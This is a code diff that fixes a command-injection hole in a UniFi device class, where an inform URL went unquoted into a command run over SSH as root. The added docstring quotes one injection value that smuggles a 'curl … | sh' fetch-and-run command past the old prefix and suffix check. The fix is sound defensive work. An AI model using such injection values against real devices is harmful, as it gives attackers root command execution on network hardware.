@@ -547,12 +547,22 @@ class UniFiDirectDevice:
     async def set_inform(self, controller_url: str) -> dict:
         """Set the inform URL to adopt this device to a controller.
         Example: controller_url = "http://192.168.1.1:8080/inform"
+
+        The URL is shell-quoted because _ssh_exec runs a command *line* on the
+        device, as root. Interpolating it raw made any caller who could reach
+        this method an arbitrary-root-command executor on customer network
+        hardware — the caller-side check only required the string to start with
+        "http" and end with "/inform", which "http://x/;curl e|sh #/inform"
+        satisfies. The route validates the URL properly as well; this is the
+        boundary that makes the shape of the string stop mattering.
         """
+        import shlex
+
         if not controller_url:
             return {"ok": False, "error": "Controller URL er påkrevd"}
         try:
             stdout, stderr, rc = await self._ssh_exec(
-                f"mca-cli-op set-inform {controller_url}", timeout=15
+                f"mca-cli-op set-inform {shlex.quote(controller_url)}", timeout=15
             )
             output = stdout.strip()
             ok = rc == 0 and ("Adoption" in output or "inform" in output.lower() or not stderr.strip())
